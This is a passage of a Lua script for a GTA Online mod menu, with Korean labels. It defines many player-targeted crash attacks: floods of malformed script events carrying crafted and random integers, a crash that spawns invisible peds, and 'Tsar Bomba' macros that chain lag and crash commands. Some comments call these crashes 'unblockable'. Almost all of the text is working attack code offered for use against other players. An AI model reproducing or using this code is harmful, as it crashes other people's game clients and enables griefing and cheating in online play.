            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V6", {"crashv15"}, "몰라, 그냥 시도. \n인기 메뉴에 의해 차단됨", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V7", {"crashv16"}, "De 2take1", function()
        for i = 1, 50 do
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
        end
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V8", {"crashv17"}, "2take1(크래시 폴더)에서\nBlocked by 덜 인기 있는", function()
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 17302, 9822, 1999, 6777888, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 27983, 7601, 1020, 3209051, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 1010, 0, 0, 0, -2653, 50555})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 1111, 0, 0, 0, -5621, 57766})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
        util.trigger_script_event(1 << player_id, {1249026189, 0, 0, 97587, 5697, 3211, 8237539, 967853})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 1967})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, -123, -957, -14, -1908, -123})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 12121, 9756, 7609, 1111111, 789666})
        util.trigger_script_event(1 << player_id, {315658550, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {-877212109, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -1, -1, -1, 18899, 1011, 3070})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {1033875141, -17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 93})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 37, 0, -7})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -13, 0, 0, 0, 23})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
        util.trigger_script_event(1 << player_id, {1249026189})
        util.trigger_script_event(1 << player_id, {315658550})
        util.trigger_script_event(1 << player_id, {-877212109})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 82})
        util.trigger_script_event(1 << player_id, {1926582096})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 3333, 0, 0, 0, -987, 21369})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2222, 0, 0, 0, -109, 73322})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.trigger_script_event(1 << player_id, {-1730227041, -494, 1526, 60541, -12988, -99097, -32105})
    end)


    -- This is a Prisuhm crash fixed by me <3

    local krustykrab = menu.list(twotake, "돈 캉그레호", {}, "관전은 위험합니다. 2T1 사용자에게 적용됩니다.")

    local peds = 5
    menu.slider(krustykrab, "주걱의 수", {}, "주걱 보내기 아~", 1, 100, 1, 1, function(amount)
        util.toast(players.get_name(player_id).. " 주걱을 보냈습니다")
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "주걱의 수", {}, "관전은 위험하니 조심하세요.", function(val)
        util.toast(players.get_name(player_id).. " 주걱을 보냈습니다")
        local crash_toggle = val
        BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    local secrashes = menu.list(crashes, "SE 크래쉬", {}, "")

    menu.action(secrashes, "SE 크래쉬 (S0)", {"crashv20"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
        util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
    end)

    menu.action(secrashes, "SE 크래쉬 (S1)", {"crashv21"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(secrashes, "SE 크래쉬 (S2)", {"crashv22"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
        util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    menu.action(secrashes, "SE 크래쉬 (S3)", {"crashv23"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
        util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
    end)

    menu.action(secrashes, "SE 크래쉬 (S4)", {"crashv24"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
                end
        util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
    end)

    menu.action(secrashes, "SE 크래쉬 (S7)", {"crashv25"}, "스크래쉬 스크립트", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
        util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
    end)

    --menu.action(crashes, "Inbloqueable V4 'Test'", {"crashv4"}, "Deberia estar arreglado por ahora", function()
    --    local mdl = util.joaat("apa_mp_apa_yacht")
    --    local user = PLAYER.PLAYER_PED_ID()
    --    local ped_pos = players.get_position(player_id)
    --   BlockSyncs(player_id, function()
    --        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    --        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    --        PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    --        util.yield(50)
    --        local pos = players.get_position(player_id)
    --        pos.z += 300
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, ped_pos, false, false, false)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) == 0
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        util.yield(50)
    --        TASK.CLEAR_PED_TASKS(user)
    --        util.yield(50)
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    --        ENTITY.SET_ENTITY_COORDS(user, ped_pos, false, false)
    --    end)
    --end)


    --menu.action(crashes, "Crash V5 'Test'", {""}, "Un crash antiguo de prisuhm, intente arreglarlo y mejorarlo.", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    --    end)
    --end)

    menu.divider(crashes, "(유력한)")

    menu.action(crashes, "차르 폭탄", {"tsarbomba"}, "크래시를 요구하는 PC, 좋은 PC가 없으면 사용하지 않는 것이 좋습니다(Unblockable uwu)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("시작...")
        util.toast("가난한 사람")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv5"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv6"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv7"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("ngcrash"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("footlettuce"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(1800)
        util.toast("모든 것이 청소되는 동안 기다리십시오 ...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
    
    menu.action(crashes, "차르 폭탄 V2", {"tsarbomba2"}, "PC 충돌, 좋은 PC가 없으면 사용하지 않는 것이 좋습니다(Unblockable uwu) \n(잘 작동하려면 일반 필요)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("시작 중...")
        util.toast("가난한 사람")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("모든 것이 청소되는 동안 기다리십시오...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)

    menu.action(crashes, "차르 폭탄 V2", {"tsarbomba2"}, "crash pc 좋은 pc 없으면 사용을 추천하지 않습니다 (Inlock uwu)\n(잘 작동하려면 규칙 필요)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("나가는 동기화>차단")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("시작...")
        util.toast("불쌍한 사람")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv8"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv9"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv11"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv15"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv16"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("모든 것이 씻겨 내려갈 때까지 기다려라...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)

    menu.action(crashes, "차르 폭탄 V4", {"tsarbomba4"}, "PC 충돌, 좋은 PC가 없으면 사용하지 않는 것이 좋습니다(차단 불가 uwu) \n(잘 작동하려면 일반 필요/과부하 가능성이 매우 높음)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
